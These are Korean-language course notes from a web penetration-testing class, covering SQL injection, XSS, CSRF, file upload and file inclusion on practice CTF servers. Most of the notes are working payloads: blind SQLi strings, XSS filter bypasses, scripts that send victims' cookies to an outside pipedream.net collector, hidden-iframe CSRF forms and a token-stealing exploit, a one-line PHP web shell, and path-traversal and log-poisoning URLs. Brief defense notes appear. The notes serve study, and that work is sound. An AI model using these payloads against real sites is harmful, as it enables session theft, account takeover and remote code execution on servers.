4주차 수업!!!

<?php
1’ union select column_name, 2 from information_schema.columns WHERE table_name = ‘admin’ #

1' and updatexml(null,concat(0x3a,(select database())),null) and ’1%’=‘1'



Blind SQL Injection / SQL 질의문 결과가 화면에 안나오는 곳

SQL Injection 가능한 모든 곳에 사용 가능
시간이 오래 걸림
자동화 능력이 있어야함 / python


원리
SQL 질의문의 결과가 참과 거짓에 따라 응답이 달라질 때

삽입하는 조건문

트릭
1. Limit [시작위치0], [개수]
	> 데이터가 하나의 행만 추출될 수 있도록 만들어주는 문법

   2. Substring [시작위치1], [개수]
	> 글자를 잘라낼 때 사용(함수)
	substring(‘normaltic’, 1, 1)=‘a’)

   3. ascii
	문자를 숫자로 표현한 코드
	ascii(‘a’) = 39

   4. 2진 탐색 / 업다운게임
	33 ~ 126
http://normaltic.com:7777/BlindSqli/login.php

————————————————————————————————
select pass from member where id=‘normaltic’



‘test’

순서?
1. substring(‘test’, 1, 1)
2. ascii(substring(‘test’, 1, )) > 0
3. ascii(substring((SQL), 1, 1)) > 0
  ascii(substring((select pass from member limit 0, 1), 1, 1)) > 0

‘ and (ascii(substring((select pass from member where id=‘normaltic’),1,1))>100) and ’1%’=‘1


Id > pajji%’ and (조건) and ’1%’=1

‘ and (1=1) and ‘1%’=‘1
‘ and (조건) and ‘1%’=‘1

select * from ~ where user_id like ‘%______%’

?>

step1. SQL 가능 유무 체크

  mario' and '1'='1 / mariosuper

  select ~~ where id='mario' and '1'='1'

step2. Payload 구성 (조건문)

  mario' and (1=2) and '1'='1

step3. database
ascii(substing((select database()), 1, 1))>70
mario' and (ascii(Substring((select database()), 1, 1))>70) and '1'='1



database: sqli_3

step4. table
select table_name from information_schema.tables Where table_schema = ‘DB’ limit 0, 1

mario' and (ascii(substring((select table_name from information_schema.tables where table_schema = ‘sqli_3’ limit 0, 1), 1, 1))>70) and '1'='1

table:

step5. column
mario' and (ascii(substring((select column_name from information_schema.columns Where table_name = ‘Table’ limit 0, 1), 1, 1))>70) and '1'='1


step6. data : segfault{Blind_SQLi_EASY}

python으로 자동화 프로그램 코딩 해보자....!

SQL Injection 훈련
> lord of SQL Injection

- SQL Injection 대응 방안.
  1. Prepared Statement
    미리 컴파일 해버림 / 변수화 / SQL Injection 원천차단
    select * from member where id='__' and pass='__'
    > 01010100101010___0101010101010__10101001001
  - 단, Prepared Statement 가 적용이 안되는 곳이 있으니.
  그 곳은 화이트 리스트 기반 필터링을 한다.

  2. 필터링 or WAF(web application Firewall) 도입
  가) 화이트 리스트 기반 필터링
  나) 블랙 리스트 기반 필터링

- 왜 SQL이 먹힐까?
  1. 옛날에 만든 사이트, 옛날 사람들.
  2. Prepared Statement를 제대로 못쓴다.
  3. Prepared Statement 적용이 안되는 곳 : order by, table 이름, column 이름

4주차 과제
1. 웹개발
2. SQLi 공격 연구 보고서 마무리
3. SQLi 3 문제 풀기!

?>
---------------------------------------------------------------------
5주차 수업

<?php
면접질문

SQL Injection
- What / 무엇인지
> 공격자가 임의의 SQL 쿼리를 삽입해 서버 측에서 실행되는 SQL 쿼리가 공격자의 의도대로 변조되는 공격

- WHERE / 어디에서 발생하는지
> 사용자의 입력값(parameter)을 SQL 질의문에 사용하는 페이지.

- Why / 왜 일어나는지
> 사용자의 입력값을 SQL 질의문에 직접 삽입해서 사용하기 때문에.

- Scenario / 뭘 할 수 있는지
> DB 데이터 추출
> DB 데이터 변조
update, delete, insert
> 인증 우회
> WEB SHELL UPLOAD
- web, was, db가 한 서버에 구축되어있을 경우 가능

- Defense / 어떻게 막는지
(1) Prepared statement
(2) 화이트 리스트 기반 필터링 / Prepared 안먹히는 곳 / order by, table 이름, column 이름

--------------------------------------------------------------------------------

XSS (Cross-Site Scripting): 크사, 크스스
"Java Script 공부!!", DVWA

+ Server Side Script VS Client Side Script(html, "java", css)
alert(1)

개념 : 클라이언트 측 스크립트(Java)를 삽입하는 공격 / (WEB)브라우저
> "공격자의 스크립트가 그대로 서버에서 응답되기 때문"

ex) : <script>session, cookie</script>

발생위치 : 파라미터 데이터가 응답에 포함되는 모든 곳!
> 영원한 우리의 친구? / Reflected XSS

- 스크립트 삽입 전략
1. 서버에 저장 - Stroed XSS
2. 서버에서 반사 - Refelected XSS
3. 클라이언트 조립 - DOM Based XSS

-----------------------------
- Reflected XSS
> 검색기능
스크립트 포함한 링크를 통해 공격 수행
사회공학기법 활용, GET방식이어야 가능 Post에서 전환 불가능시 X

Tip: params 포함, 응답에 입력값 포함되어있는지, 리피터에서 응답위치 확인, 톱니(Auto scroll)
<"'> / <script></script> 필터링 확인, URL 카피"

--------------------------------------------------------
- Dom Based XSS : 클라이언트 측에서 조립
> 서버응답x, 서버저장x
-- document.write(사용자의 파라미터) / url에 삽입?
링크를 통해서 공격 수행

---------------------------------------------------------
XSS - Session ID
> Javascript
-- document.cookie ->

WEB Server
access log

<script>document.write('<img src="http://normaltic.com/?'+document.cookie+'"/>');</script>

<script>alert("Reflected")</script>


"과   제"
1. XSS 복습
- stored XSS, Reflected XSS

Stored XSS : http://normaltic.com:1018/xss_1/notice_update.php?id=178
Relfected XSS : http://normaltic.com:1018/xss_2/notice_update.php?id=60"/><script>alert('XSS')</script>

alert('XSS')

2. 웹 개발

3. 보고서

다음시간
1. XSS 실전 해킹 - 여러가지 시나리오
2. CTF - Session ID 탈취 방법

 ?>


 ---------------------------------------------------------------------
 6주차 수업
	초봉: 3000 전후

<?php
1. Stored XSS
	- HTML, DB

2. Reflected XSS
	- Link (URL)
	* 공격 링크를 만들어라!

3. DOM Based XSS
	- 클라이언트 측에서 조립! / 잘 안나옴 / 찾기 힘듦
	- document.write() / html, js 응답 분석

- XSS Point : alert(1)



-- XSS 필터링 우회
1. Client Side 검증
> 필터링을 js로 구현 / burp 인터셉트나, 개발자 Elements 코드 조작

2. Black List 키워드 필터링
(1) 대소문자 혼합 : Script
(2) 키워드 반복 : <scrsctiptipt>alert(1):</scrscriptipt>
-- xss without script, braket, quort

3. Event Handler
> 클릭, 화면에 띄워졌을 때, 마우스가 올라갔을 때, 에러가 났을때...

<img src=~~~ onerror="alert('xss')">

onmouseover
onactivate
onload
<audio src="음악 파일 경로" onplay="alert(1);" autoplay;>

div, object, svg

* 예상 외 xss 포인트
<script> 안에 있을 수도

value에 입력값이 들어갈때
<input name="title" value="pajji" onfocus="alert(1)" auto focus>

----------------------------
* 공격 시나리오
1. Session 탈취
</div><script>document.wirte('<img src="+document.cookie"/>');</script><div>

2. HTML Injection

3. Key Logger 삽입
javascript keylogger

4. Miner 실행 / 영상시청 사이트
> javascript(xss) miner : 메모리 점유율

5. Redirect (Phishing)
<script>location.href="https://22222.com";</script>
<script>location.replace("https://22222.com";)</script>

-------------------------------------------------
* 대응 방안
> HTML 특수 문자를 HTML Entity 치환

예외) HTML Editor
> 에디터를 쓰지말자.. / 써야한다면..
1. 사용자 입력에서 모든 HTML 특수 문자들을 HTML Entity로 치환
2. 허용할 Tag, 화이트리스트 기반으로 허용할 태그들을 다시 복구
3. 스크립트 실행이 가능한(제한해야할) Event Handler 블랙 리스트 기반으로 필터링

---------------------------------------------------

XSS CTF
Session 탈취
VPS

<script>location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"+document.cookie;</script>



XSS
_ alert('xss');

* 과제
1. normaltic.com XSS 문제 풀이
1번 : http://normaltic.com:1018/xss_1/notice_read.php?id=52&view=1
flag :

2번 : http://normaltic.com:1018/xss_2/notice_list.php?option_val=username&board_result=aaa');location.replace("https://eoky46j4rt0f4na.m.pipedream.net/?"%2bdocument.cookie);('&board_search=%F0%9F%94%8D&date_from=&date_to=
flag :

3번 : http://normaltic.com:1018/xss_3/mypage.php?user=%22/%3E%3Cscript%3Elocation.href=%22https://eoky46j4rt0f4na.m.pipedream.net/?%22%2bdocument.cookie;%3C/script%3E
flag : segfault{XSS_Is_Mirror}

4번(xss_5) : http://normaltic.com:1018/xss_5/notice_read.php?id=2&view=1
flag :

5번(xss_7) : http://normaltic.com:1018/xss_7/notice_update.php?id=42
</textarea><script>location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"+document.cookie;</script> <textarea>
정답
http://normaltic.com:1018/xss_7/login.php?id=1}');location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"%2bdocument.cookie;('&pw=1234

flag :

6번(xss_6) : http://normaltic.com:1018/xss_6/notice_update.php?id=66
flag :

2. XSS 공격 연구 보고서


제목 : 답안 제출
내용 : 공격 URL



------------------------------------------------
1. 사고 안치는 사람
2. 친밀한 사람?? 사교적인
3. 꼼꼼함.

<img src=x onmouseover="alert('xss')">


 ?>




------------------------------------------------------
7주차 수업
<?php
자격증
1. 정보보안기사
2. OSCP
> 침투테스트 (pentest)

* 모의해킹
- 웹 해킹 프로젝트
- 모바일 앱 해킹 프로젝트 / 안드로이드, ios
- 침투테스트 프로젝트
- OA 침투 + 와이파이 해킹


---------------------------------------------------------

* CSRF VS XSS ??
> 피해자가 의도치 않게 웹 서버로 특정 요청을 하게 만드는 공격!

"내 비밀번호를 1234로 바꿔줘"

xss : 클라이언트 측 공격
csrf : 서버 측 공격

why??
- 공격자가 요청을 예측하고 만들 수 있어서!

> 링크를 못 만들게 한다.
> 기존 비밀번호를 적으면 url에 포함되어 공격자가 pw를 몰라서 공격을 못하게 된다.

> POST 방식이면 csrf 단독 공격 안된다.

* POST Method
> CSRF + XSS

1. 무언가 바뀌어지는 페이지
2. 바꾸는 요청 확인
3. 입력값 위치 확인
4. GET방식으로 전환
5. POST 방식일 때 (xss 활용)
- 다른 게시판에 form 태그 활용 method 변경

--------------기본형식-------------------

<form method="POST" action="url">
	<input type="hidden" name="email" value="변경">
	<input type="submit" value="Click Me">
</form>

-------------자동실행(document.forms)----------------

<form method="POST" action="-">
	<input type="hidden" name="email" value="pajji@test.com">
</form>
<script>
      document.forms[0].submit();
</script>
-------------버튼 가리기(iframe), 페이지 이동 강제(body onload)----------------


<iframe style="visibility:hidden;display:none" name="stealthframe">
</iframe>

<body onload="document.csrf_form.submit();">
<form method="POST" name="csrf_form" action="url" target="stealthframe">
	<input type="hidden" name="email" value="example@test.com">
</form>
<script>
	document.forms[0].submit();
</script>
http://normaltic.com:1018/xss_7/notice_list.php

----------------post 일때 위 코드 사용-----------------
* 과제

1. GET Credential (xss_7)
-> XSS 찾기! update 아님..
http://normaltic.com:1018/xss_7/login.php?id=1}');alert(1);('&pw=1234
http://normaltic.com:1018/xss_7/login.php?id=1}');location.href="https://eoky46j4rt0f4na.m.pipedream.net/?"%2bdocument.cookie;('&pw=1234

2. CSRF
- 개념 정리
"https//portswigger.net/web-security/csrf/lab-no-defenses"
(post mothod, 자동 전송, 스텥스폼)
- 게시판 : 글쓰기, 마이페이지(비밀번호 바꾸기 csrf)

3. 웹 개발

?>

-----------------------------------------------------------------------
8주차 수업
<?php
> 해킹대회 참여해봐라!
- CTF "flag"
- Bug Bounty

> 해킹 컨퍼런스
- Codegate
컴퓨터 관련 컨퍼런스 참여 경험
------------------------------------------------------------------------
SQL Injection > 서버 측 공격(서버에게 공격을 날린다.)

XSS / CSRF > 클라이언트 측 공격(클라이언트에게 공격을 날린다.): 사이트 이용자가 있어야한다.

\ : escape 문자 뒷글자(특수문자)를 그냥 문자로 인식
\' : 문자그대로의 '로 인식

-------------------------------------------------------------------------
* CSRF 공격
> 피해자가 자신도 모르게 서버로 임의의 요청을 하게 만드는 공격
ex) "비밀번호 바꿔줘!", "이메일 주소 바꿔줘!", "게시글 작성해!" 등

GET / POST
GET 요청 : 파라미터가 URL에 포함
- "나 비밀번호 1234로 바꿔줘!"
> http://akdajsdkaskdk.com

XSS
<img src="http://sdasdasd.com">

--------------------------------------------------------------------------
* CSRF 공방
post로 바꾸면 되겠네!
> xss
<form>

</form>

- Referrer 헤더 검증 / Referrer를 지워버리면 끝??
> 하위 호환

만약, refeter 헤더가 있으면 검사!
없으면, 넘어가자!

레퍼러 삭제 코드
<meta name="referrer" content="no-referrer">

CSRF 토큰
> 랜덤한 값.
>> xss가 있으면 값을 가져올 수 있다..

>> 인증정보 추가
ex) pw파라미터 등...
?>

인증

- CSRF Token 값 가져오는 코드

<iframe id="getCSRFToken" src="http://adas.com/mypage.php" width=

<script>
function exploit() {
	var token = document.gerElemenById("getCSRFaToken").contentDocument

}
</script>




CSRF part 1 / http://normaltic.com:7777/csrf_1/notice_read.php?id=154&view=1
<body onload="location.href='http://normaltic.com:7777/csrf_1/mypage_update.php?id=&info=&pw=1234'";>


CSRF Part 2 / http://normaltic.com:7777/csrf_2/notice_update.php?id=40&view=1
<iframe style="visibility:hidden;display:none" name="stealthframe" sandbox="allow-forms">
</iframe>
<body onload="document.csrf_form.submit();">
<form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_2/mypage_update.php" target="stealthframe">
	<input type="hidden" name="pw" value="1234">
</form>
------------------------------
<script>
	document.forms[0].submit();
</script>

CSRF Part 3 / http://normaltic.com:7777/csrf_3/notice_update.php?id=89&view=1
내 답
<meta name="referrer" content="no-referrer">
<iframe style="visibility:hidden;display:none" name="stealthframe" sandbox="allow-forms">
</iframe>
<body onload="document.csrf_form.submit();">
<form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_2/mypage_update.php" target="stealthframe">
	<input type="hidden" name="pw" value="1234">
</form>

-정답-
<iframe id="getCSRFToken" src="http://normaltic.com:7777/csrf_3/mypage.php" width="0" height="0" border="0" onload="exploit()"></iframe>

<iframe width="0" height="0" border="0" name="stealthframe" id="stealthframe" style="display: none;"></iframe>

<script>
function exploit() {
     var token = document.getElementById("getCSRFToken").contentDocument.forms[0].csrf_token.value;

     var ch_pass = '1234';
     document.writeln('<form width="0" height="0" border="0" method="post" action="http://normaltic.com:7777/csrf_3/mypage_update.php" target="stealthframe">');
    document.writeln('<input type="hidden" name="pw" value="' + ch_pass + '" /><br />');
    document.writeln('<input type="hidden" name="csrf_token" value="' + token + '" />');
     document.writeln('<input type="submit" name="submit" value="Exploit" /><br/>');
     document.writeln('</form>');
     document.forms[0].submit.click();
}
</script>



과제
1) CSRF 문제 1, 2
2) CSRF 연구 보고서 작성
3) 웹 개발
4) CSRF 문제 풀이 3

<script>
var csrf_token = $("#csrf_token").html();
alert(csrf_token);
</script>
.
.
<html>
  <!-- CSRF PoC - Burp Suite Professional에서 생성 -->
  <body>
  <script>history.pushState('', '', '/')</script>
	<body onload="document.csrf_form.submit();">
    <form method="POST" name="csrf_form" action="http://normaltic.com:7777/csrf_3/mypage_update.php">
      <input type="hidden" name="pw" value="1234"/>
      <input type="hidden" name="csrf_token" value=MD5(document.cookie) />
			<meta name="referrer" content="no-r  eferrer">
    </form>
  </body>
</html>


RE111590460NL
-------------------------------------------------------------
9주차 수업
<?
<File Upload>
> 공격자가 원하는 임의의 파일을 업로드 할 수 있는 취약점

- 발생 가능위치
> 파일을 업로드하는 곳

- 공격 시나리오 / 구체적 방안까지 생각
(1) 서버 측 실행 파일 업로드
> RCE -> 서버 장악 (Webshell)

(2) Deface 공격
> 웹 루트에서 메인 페이지 변조

(3) 디도스
> 대용량 파일 업로드

* Web SHELL / url을 활용하여 파일 실행 요청
> 서버에 임의의 명령을 내릴 수 있는 서버 측 실행 파일

- 1줄 web shell, 1구화목마
<?php echo system($_GET['cmd']); ?>

// Command (ls, id, ifconfig...)

system('ls')

webshell.php?cmd=id

* 내가 올린 webshell을 실행하는 방법
> 우리가 올린 파일이 어디있는지
find / -name // "" 2> /dev/null

- 대놓고 php, jsp, asp 파일이 올라가는 곳 별로 없다.

- 우회 Bypass가 필수적
1) 파일 검증 우회
* Content Type MIME
jpg로 바꿔라

2) 확장자 검증
.php .jsp 만 검증 할때

우회 확장자 사용
.phtml, .php3, .php5, .jspx
.pHp>
webshell.php%00.jpg(윈도우 서버에서만 가능)

3) 서버측 파일 오버라이드 =/ 오버리딩
.htaccess
AddType application/x-httpd-php .normaltic

webshell.normaltic

4) File Signature / hex : Hex Editor 활용
확장자별 고유 HEX 마지막에 코드 삽입
> moon.jpg 를 .php로 바꿔서 올린다
앞부분 jpg 시그니쳐만 확인해서 그냥 php로 코드가 실행이 된다.

5) 파일 업로드 다른 Method : PUT
PUT / webshell.php
request body에 코드 작성

6) 개발자의 실수 + 클라이언트 측 검증

- 과제
1) 파일 업로드 공격 정리
2) File Upload 1,2번째 문제 풀이
3) 웹 개발 & 보고서

https://ctftime.org/

?>
-------------------------------------------------------------
10주차 수업
<?php
필터링!
- 업로드 되지 않는다.

1. 클라이언트 측 필터링
> 이용자들의 편의!

2. 서버측 필터링 (검증코드)
: 잘못구현.

실패하면 > 파일을 저장x, 파일 업로드 받아서는 X

+ 로그인
실패 시 > 다른 페이지로 리다이렉트

---------------------------------------------------------------------------
파일 업로드

if(파일 검사 코드){
~~~
}

- 내가 올린 파일 어디에 어떻게 저장되는지 / 정상파일을 먼저 올려보자
ex) http:~~~~/files/pajji/pajji.png

(1) 이미지 파일 웹쉘
.php
서버측 실행 파일의 확장자만!!! 실행할 수 있다!

.jpg, .png 실행가능?>
<?php

특정조건에 따라서
> 다른 취약점.

> File Inclusion 취약점
- LFI : Local File Include
- RFI : Remote File Include
urlPath=http:~~~~~/webshell.txt
?>
> <?php ehco ~~ ?>
<<?php
include($_GET['urlPath']);

--- 웹개발 : include
> 취약점

include('사용자의 파라미터')

??lang=en.php

page=/etc/passwd (해당파일이 있다면 가져옮)
-----------------------------------------------------------------------
- File Include 핵심
* 서버에 있는 원하는 파일을 확인할 수 있다.

> 소스코드를 볼 수 없다.. / was에서 php를 실행해버림
> php 코드를 실행한다.
> 그림파일 마지막에 php(webshell)코드를 포함하여 file upload 시키고, include, 명령어를 실행해본다.
?>
> ../../files/pajji.png&<?php echo system($_GET['cmd']); ?>
<?php
* 파일 Include 취약점
> 파일 업로드 기능이 없어도 가능하다
 ?>
- GET/<?php echo system($_GET['cmd']); ?>
> RCE 가능
<?php
access.log > 접근 로그
웹 서버로 들어오는 로그

http://normaltic.com:9023/lfi_1/files/%eb%b0%95%ec%a7%80%ec%99%84/webshell.png

include("./lang/" .$_GET['lang']);
* 디렉로리 트레버져
./lang/../../../../../../etc/passwd

 ?>

-----------------------------------------------------------------------
<?php
> File Download 취약점
> 서버에 있는 임의의 파일을 다운로드 취약점
** 파일 다운로드 종류
1) 직접 접근 > 인가

2) 다운로드 스크립트 작성
download.php?filePath=파일 경로

http://normaltic.com:3184/download_1/download.php?filePath=/../../../../../password.txt

> 서버에 있는 모든 파일을 공격자가 가져갈 수 있다.
?>
/서버 측 소스코드
login.php
<?php
	include('./db.php');
	include('./top.php');

	db_connect();
?>
<?php
소스코드 받아야하는 이유!
1. 주석 코드
2. 취약점 찾기 위해서

- 소스코드
> DB 연결 정보



> DB 계정 비밀번호
1) 파일 다운로드 취약점을 찾고
2) DB 계정 비밀번호 찾아서 DM 보내기
?>
.
.
.
.
.
.
..
.
.
.
.
.
.
.
.
.
.

.
.
.
.
.
.
.
.
.
.
.
.
..
.
